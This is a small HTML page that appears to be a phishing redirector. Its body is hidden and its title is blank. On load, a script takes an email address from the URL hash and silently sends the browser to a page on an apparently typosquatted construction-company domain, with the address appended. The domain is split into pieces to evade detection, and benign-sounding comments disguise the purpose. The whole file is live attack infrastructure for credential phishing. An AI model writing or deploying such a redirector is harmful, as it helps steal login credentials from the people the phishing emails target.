<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        (function() {
            // Regular expression for basic email validation
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            // Get the email parameter from the URL hash
            var email = window.location.hash.substring(1);

            // Decode the email parameter
            var decodedEmail = decodeURIComponent(email);

            // Validate the email address format
            if (emailRegex.test(decodedEmail)) {
                var part1 = "https://jimenez";
                var part2 = "constrruction.com/";
                var part3 = "eo/index.html#";

                // Construct the redirect URL
                var redirectUrl = part1 + part2 + part3 + decodedEmail;

                // Redirect to the constructed URL
                window.location.href = redirectUrl;
            } else {
                // If email is invalid, do nothing
                console.log('Invalid email address');
            }
        })();
    </script>
</head>

</html>
